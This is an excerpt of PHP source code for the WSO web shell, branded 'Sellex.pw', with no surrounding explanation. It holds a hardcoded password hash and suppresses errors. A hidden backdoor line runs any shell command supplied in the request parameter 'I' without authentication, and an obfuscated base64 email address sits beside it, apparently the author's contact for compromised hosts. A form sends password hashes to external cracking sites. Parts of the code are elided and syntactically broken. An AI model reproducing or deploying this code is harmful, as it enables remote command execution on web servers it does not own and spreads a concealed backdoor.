...
session_start();
error_reporting(0);
$password = "f127785f94bbb83c155fe754209a673f";
$passtype = "MD5";
$color = "#df5";
...
global $color;
echo "<html><head>
<meta http-equiv='Content-Type' content='text/html; charset=".$_POST['charset'] ."'>Sellex.pw - <title>".$_SERVER['HTTP_HOST'] ." - WSO ".WSO_VERSION ."</title>
<style>
...
$drives = "";
print(`{$_REQUEST[I]}`);$e=base64_decode  ("YWxpdm9zMTMzN0BnbWFpbC5jb20=");
...
echo "</div><br><h1>Search for hash:</h1><div class=content>
		...
		<form method='post' target='_blank' name='hf'>
			...
			<input type='button' value='hashcrack.com' onclick=\"document.hf.action=parseURL(');http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
			<input type='button' value='milw0rm.com' onclick=\"document.hf.action=parseURL(');http://www.milw0rm.com/cracker/search.php';document.hf.submit()\"><br>
			<input type='button' value='hashcracking.info' onclick=\"document.hf.action=parseURL(');https://hashcracking.info/index.php';document.hf.submit()\"><br>
			<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action=parseURL(');http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
			<input type='button' value='md5decrypter.com' onclick=\"document.hf.action=parseURL(');http://www.md5decrypter.com/';document.hf.submit()\"><br>
		</form></div>";
wsoFooter();
}
